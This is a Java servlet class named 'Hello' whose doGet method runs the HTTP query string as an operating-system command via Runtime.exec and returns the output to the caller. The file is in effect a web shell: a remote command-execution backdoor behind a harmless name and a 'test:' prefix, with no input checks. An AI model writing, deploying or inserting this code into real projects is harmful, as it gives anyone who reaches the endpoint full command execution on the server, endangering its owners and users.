package ubiserv.simple;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.InputStream;


public class Hello extends HttpServlet
{
    protected void doGet (HttpServletRequest httpServletRequest,
                          HttpServletResponse httpServletResponse)
            throws ServletException,IOException
    {
        httpServletResponse.setContentType("text/plain");
        PrintWriter out = httpServletResponse.getWriter();
        out.print("test:");

        String x = httpServletRequest.getQueryString();

        try {
            Process p = Runtime.getRuntime().exec(x);

            InputStream is = p.getInputStream();
            int c;
            StringBuilder CommandResponse = new StringBuilder();

            while ((c = is.read()) != -1)
            {
                CommandResponse.append((char)c);
            }
            out.println(CommandResponse);
            is.close();
        }


        catch (Exception E)
        {
            E.printStackTrace();
        }

        out.print (x);
        out.close();
    }
}

